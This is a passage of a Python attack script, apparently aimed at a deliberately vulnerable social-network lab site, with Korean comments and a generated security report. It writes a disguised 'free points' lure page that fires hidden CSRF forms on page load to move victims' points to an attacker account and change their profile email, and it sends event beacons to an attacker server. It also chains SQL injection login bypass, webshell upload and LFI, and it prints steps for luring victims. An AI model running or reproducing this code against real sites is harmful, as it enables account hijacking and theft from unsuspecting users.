        fake_gift_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>🎁 무료 포인트 받기!</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }}
        .gift-box {{
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.9); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        h1 {{
            color: #667eea;
            font-size: 2.5em;
            margin-bottom: 20px;
        }}
        .gift-icon {{
            font-size: 100px;
            animation: bounce 1s infinite;
        }}
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-20px); }}
        }}
        button {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }}
        button:hover {{
            transform: scale(1.1);
        }}
        .loading {{
            display: none;
            margin-top: 20px;
            color: #667eea;
            font-size: 1.1em;
        }}
        .success {{
            display: none;
            color: #28a745;
            font-size: 1.5em;
            margin-top: 20px;
        }}
        #status {{
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
            min-height: 60px;
        }}
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">자동으로 포인트를 받는 중...</div>
        <button onclick="claimGift()" id="claimBtn">💰 포인트 받기 💰</button>
        <div class="loading" id="loading">⏳ 처리 중...</div>
        <div class="success" id="success">✅ 완료!</div>
    </div>

    <div id="csrfForms"></div>

    <script>
        let attackExecuted = false;
        const ATTACKER_ID = '{self.attacker_user_id}';
        const TARGET_SNS = '{self.base_url}';

        window.onload = function() {{
            fetch('{self.attacker_server}/notify?event=page_loaded&time=' + new Date().toISOString())
                .catch(() => {{}});

            document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';

            setTimeout(() => {{
                executeCSRF();
            }}, 2000);
        }};

        function claimGift() {{
            if (attackExecuted) return;
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            executeCSRF();
        }}

        function executeCSRF() {{
            if (attackExecuted) return;
            attackExecuted = true;

            document.getElementById('status').innerHTML = '포인트 전송 중...';
            document.getElementById('claimBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            const amounts = [5000, 3000, 1000, 500, 300, 100];
            let formHTML = '';

            amounts.forEach((amount, index) => {{
                formHTML += `
                    <form id="csrfForm${{index}}" method="POST" action="${{TARGET_SNS}}/profile.php" style="display:none" target="iframe${{index}}">
                        <input type="hidden" name="send_gift" value="1">
                        <input type="hidden" name="receiver_id" value="${{ATTACKER_ID}}">
                        <input type="hidden" name="gift_type" value="diamond">
                        <input type="hidden" name="points" value="${{amount}}">
                        <input type="hidden" name="message" value="Event Gift ${{amount}}P">
                    </form>
                    <iframe id="iframe${{index}}" name="iframe${{index}}" style="display:none"></iframe>
                `;
            }});

            formHTML += `
                <img src="${{TARGET_SNS}}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
                     style="display:none" 
                     onload="notifyProfileChange()">
            `;

            document.getElementById('csrfForms').innerHTML = formHTML;

            amounts.forEach((amount, index) => {{
                setTimeout(() => {{
                    const form = document.getElementById('csrfForm' + index);
                    if (form) {{
                        form.submit();
                        console.log('[+] Submitted form for ' + amount + 'P');

                        fetch('{self.attacker_server}/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
                            .catch(() => {{}});

                        document.getElementById('status').innerHTML = 
                            '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
                    }}
                }}, index * 500);
            }});

            setTimeout(() => {{
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').innerHTML = 
                    '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
                document.getElementById('success').style.display = 'block';
                document.getElementById('status').style.display = 'none';

                fetch('{self.attacker_server}/notify?event=csrf_completed&attempts=' + amounts.length)
                    .catch(() => {{}});

                console.log('[+] All CSRF attempts completed');
            }}, amounts.length * 500 + 1000);
        }}

        function notifyProfileChange() {{
            console.log('[+] Profile changed via GET CSRF');
            fetch('{self.attacker_server}/notify?event=profile_changed&method=GET')
                .catch(() => {{}});
        }}
    </script>
</body>
</html>"""

        with open("fake-gift.html", 'w', encoding='utf-8') as f:
            f.write(fake_gift_html)

        print(f"[+] fake-gift.html saved!")

        self.log_event(
            'SETUP',
            'Generated fake-gift.html attack page',
            'INFO',
            {
                'filename': 'fake-gift.html',
                'attacker_id': self.attacker_user_id,
                'attack_server': self.attacker_server
            }
        )

    def generate_html_report(self):
        """상세한 HTML 리포트 생성"""
        end_time = datetime.now()
        duration = (end_time - self.start_time).seconds

        total_vulns = sum(len(v) for v in self.vulnerabilities.values())
        critical_count = sum(1 for vuln_list in self.vulnerabilities.values()
                             for vuln in vuln_list
                             if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0)
        high_count = sum(1 for vuln_list in self.vulnerabilities.values()
                         for vuln in vuln_list
                         if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0)

        html_content = f"""<!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>보안 진단 리포트 - Vulnerable SNS</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: 'Segoe UI', 'Malgun Gothic', sans-serif;
                background: #f5f7fa;
                padding: 40px 20px;
            }}
            .container {{
                max-width: 1200px;
                margin: 0 auto;
                background: white;
                box-shadow: 0 0 30px rgba(0,0,0,0.1);
            }}
            .header {{
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 40px;
            }}
            .header h1 {{
                font-size: 2.5em;
                margin-bottom: 10px;
            }}
            .vuln-card {{
                background: white;
                border: 1px solid #e0e0e0;
                border-left: 5px solid #dc3545;
                border-radius: 8px;
                padding: 25px;
                margin-bottom: 20px;
            }}
            .vuln-detail {{
                background: #f8f9fa;
                padding: 15px;
                border-radius: 6px;
                margin: 10px 0;
                font-size: 0.9em;
            }}
            .critical {{ color: #dc3545; }}
            .high {{ color: #fd7e14; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔒 웹 애플리케이션 보안 진단 리포트</h1>
                <div class="meta">
                    <p><strong>대상 시스템:</strong> {self.base_url}</p>
                    <p><strong>진단 일시:</strong> {self.start_time.strftime('%Y년 %m월 %d일 %H:%M:%S')}</p>
                    <p><strong>소요 시간:</strong> {duration}초</p>
                </div>
            </div>

            <div class="section">
                <h2>📊 Executive Summary (경영진 요약)</h2>
                <p>본 보안 진단에서는 <strong class="critical">{total_vulns}개의 보안 취약점</strong>이 발견되었습니다.</p>
                <p>특히 <strong class="critical">Command Injection을 통한 원격 코드 실행</strong>이 확인되어 즉각적인 조치가 필요합니다.</p>
            </div>

            <div class="section">
                <h2>🔴 발견된 취약점 상세 분석</h2>
    """

        # SQL Injection 취약점
        if self.vulnerabilities['sql_injection']:
            html_content += """
            <h3 style="color: #dc3545;">1️⃣ SQL Injection (SQLi)</h3>
    """
            for idx, vuln in enumerate(self.vulnerabilities['sql_injection'], 1):
                cvss = vuln.get('cvss_score', 0)
                html_content += f"""
            <div class="vuln-card">
                <h3>SQL Injection #{idx} - 인증 우회 (CVSS {cvss})</h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln.get('url', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong><br>
                    Username: <code>{vuln.get('username', 'N/A')}</code><br>
                    Password: <code>{vuln.get('password', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 기법:</strong> {vuln.get('description', 'N/A')}
                </div>
            </div>
    """

        # File Upload 취약점 (Command Injection 포함)
        if self.vulnerabilities['file_upload']:
            html_content += """
            <h3 style="color: #dc3545;">2️⃣ File Upload & Command Injection</h3>
    """
            for idx, vuln in enumerate(self.vulnerabilities['file_upload'], 1):
                cvss = vuln.get('cvss_score', 0)

                if vuln.get('type') == 'Command Injection via POST':
                    html_content += f"""
            <div class="vuln-card">
                <h3>🚨 Command Injection #{idx} - 원격 코드 실행 (CVSS {cvss})</h3>
                <div class="vuln-detail">
                    <strong>공격 URL:</strong> <code>{vuln.get('url', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 방법:</strong> {vuln.get('type', 'N/A')}
                </div>
                <div class="vuln-detail">
                    <strong>취약 파라미터:</strong> <code>{vuln.get('parameter', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong> <code>{vuln.get('payload', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>실행 결과:</strong> {vuln.get('indicators_found', [])}
                </div>
                <div class="vuln-detail">
                    <strong>응답 미리보기:</strong><br>
                    <code style="display: block; background: #f8f9fa; padding: 10px;">
    {vuln.get('response_preview', 'N/A')[:300]}...</code>
                </div>
            </div>
    """
                else:
                    # 일반 파일 업로드
                    html_content += f"""
            <div class="vuln-card">
                <h3>File Upload #{idx} (CVSS {cvss})</h3>
                <div class="vuln-detail">
                    <strong>업로드 파일:</strong> <code>{vuln.get('filename', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>설명:</strong> {vuln.get('description', 'N/A')}
                </div>
            </div>
    """

        # XSS/CSRF 취약점
        if self.vulnerabilities['xss']:
            html_content += """
            <h3 style="color: #dc3545;">3️⃣ Cross-Site Request Forgery (CSRF) + XSS</h3>
    """
            for idx, vuln in enumerate(self.vulnerabilities['xss'], 1):
                cvss = vuln.get('cvss_score', 0)
                html_content += f"""
            <div class="vuln-card">
                <h3>CSRF #{idx} - 사용자 권한 도용 (CVSS {cvss})</h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln.get('url', 'N/A')}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 URL:</strong> <code>{vuln.get('target_url', 'N/A')}</code>
                </div>
            </div>
    """

        html_content += """
            </div>

            <div class="section">
                <h2>📋 긴급 권고사항</h2>
                <div style="background: #fff3cd; border-left: 5px solid #ffc107; padding: 20px;">
                    <h3>🚨 즉시 조치 필요</h3>
                    <ul style="margin-left: 20px;">
                        <li><strong>Command Injection:</strong> 사용자 입력 검증 강화 필요</li>
                        <li><strong>SQL Injection:</strong> Prepared Statement 사용</li>
                        <li><strong>File Upload:</strong> 파일 검증 및 실행 권한 제거</li>
                        <li><strong>CSRF:</strong> CSRF 토큰 구현</li>
                    </ul>
                </div>
            </div>

            <div style="background: #2d3436; color: white; text-align: center; padding: 30px;">
                <p>VulnerableSNS Security Assessment Tool v1.0</p>
                <p>© 2024 Security Research Team</p>
            </div>
        </div>
    </body>
    </html>
    """

        # HTML 파일 저장
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"\n[+] HTML Report saved: {report_filename}")
        return report_filename


    def generate_json_report(self):
        """JSON 리포트 생성"""
        report = {
            'metadata': {
                'target': self.base_url,
                'attacker_server': self.attacker_server,
                'start_time': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
                'end_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'duration_seconds': (datetime.now() - self.start_time).seconds,
                'attacker_user_id': self.attacker_user_id,
                'tool_version': '1.0'
            },
            'summary': {
                'total_vulnerabilities': sum(len(v) for v in self.vulnerabilities.values()),
                'critical_count': sum(1 for vuln_list in self.vulnerabilities.values()
                                      for vuln in vuln_list
                                      if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0),
                'high_count': sum(1 for vuln_list in self.vulnerabilities.values()
                                  for vuln in vuln_list
                                  if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0),
                'vulnerability_breakdown': {
                    'sql_injection': len(self.vulnerabilities['sql_injection']),
                    'file_upload': len(self.vulnerabilities['file_upload']),
                    'lfi': len(self.vulnerabilities['lfi']),
                    'xss': len(self.vulnerabilities['xss']),
                    'csrf': len(self.vulnerabilities['csrf'])
                }
            },
            'vulnerabilities': self.vulnerabilities,
            'attack_timeline': self.attack_timeline,
            'artifacts': {
                'uploaded_webshell': self.uploaded_webshell,
                'fake_gift_page': 'fake-gift.html'
            }
        }

        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"[+] JSON Report saved: {report_filename}")
        return report_filename

    def run_assessment(self):
        """전체 평가 실행"""
        print("\n" + "=" * 60)
        print("Vulnerable SNS - Security Assessment")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("=" * 60)

        self.log_event('SCAN_START', f'Security assessment started on {self.base_url}', 'INFO')

        # 1. SQL Injection
        time.sleep(1)
        self.test_sql_injection_login()

        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            self.log_event('SCAN_FAILED', 'Unable to gain access to the system', 'ERROR')
            return

        # 2. File Upload
        time.sleep(1)
        self.test_file_upload_rce()

        # 3. LFI
        time.sleep(1)
        lfi_success = self.test_lfi()

        # 4. 대체 공격 방법들 (새로 추가!)
        if not lfi_success:  # LFI가 실패했을 때만 실행
            print("\n[*] LFI failed. Trying alternative attack vectors...")
            alternative_success = self.test_alternative_attack_vectors()

            if alternative_success:
                print("[+] Alternative attack method succeeded!")
            else:
                print("[-] All RCE methods failed")
        # 4. XSS + CSRF Combined
        time.sleep(1)
        self.test_xss_csrf_combined()

        # 5. fake-gift 페이지 생성
        self.generate_fake_gift_page()

        self.log_event('SCAN_COMPLETE',
                       f'Security assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found',
                       'INFO')

        # 5. 추가 XSS 테스트 (새로 추가)
        # 5. XSS 테스트 (개선된 디버그 버전)
        # 5. XSS 테스트 (강화된 디버그 버전)
        time.sleep(1)
        xss_success = self.test_stored_xss_debug_enhanced()

        # 교육용 XSS 데모 생성
        self.create_educational_xss_demo()

        # 6. 리포트 생성
        self.print_section("Generating Reports")
        html_report = self.generate_html_report()
        json_report = self.generate_json_report()

        # 콘솔 요약 출력
        self.print_report()

        print(f"\n[+] Assessment complete!")
        print(f"[+] HTML Report: {html_report}")
        print(f"[+] JSON Report: {json_report}")
        print(f"[+] fake-gift.html: Ready for deployment")

    def print_report(self):
        """콘솔 요약 출력"""
        self.print_section("Assessment Summary")

        total = sum(len(v) for v in self.vulnerabilities.values())
        print(f"\n✓ Total vulnerabilities found: {total}\n")

        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"\n[{vuln_type.upper()}] - {len(vulns)} found")
                print("-" * 60)
                for i, vuln in enumerate(vulns, 1):
                    print(f"{i}. {vuln.get('description', vuln.get('type', 'N/A'))}")
                    if 'cvss_score' in vuln:
                        print(f"   CVSS Score: {vuln['cvss_score']}")
                    if 'impact' in vuln:
                        print(f"   Impact: {vuln['impact']}")
                    print()

        print(f"\n" + "=" * 60)
        print("CSRF Attack Setup Instructions")
        print("=" * 60)
        print(f"[*] Next steps:")
        print(f"    1. Start Flask server: python3 attacker_server.py")
        print(f"    2. Verify fake-gift.html is accessible: {self.attacker_server}/fake-gift")
        print(f"    3. Victim clicks malicious post link")
        print(f"    4. Monitor dashboard: {self.attacker_server}/")
        print(f"    5. Check attack logs in real-time")
        print(f"\n[*] Expected results:")
        print(f"    - Victim's points transferred to attacker (ID: {self.attacker_user_id})")
        print(f"    - Victim's profile modified")
        print(f"    - All actions logged to Flask server")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python3 auto_fixed.py <target_url> <attacker_server>")
        print("Example: python3 auto_fixed.py http://18.179.53.107/vulnerable-sns/www http://13.158.67.78:5000")
        sys.exit(1)

    target = sys.argv[1]
    attacker_server = sys.argv[2]

    attacker = VulnerableSNSAttacker(target, attacker_server)
    attacker.run_assessment()

    print("\n" + "=" * 60)
    print("✅ Assessment completed successfully!")
    print(f"📊 Check the generated HTML report for detailed findings")
    print(f"🎯 Monitor attacks at: {attacker_server}")
    print("=" * 60)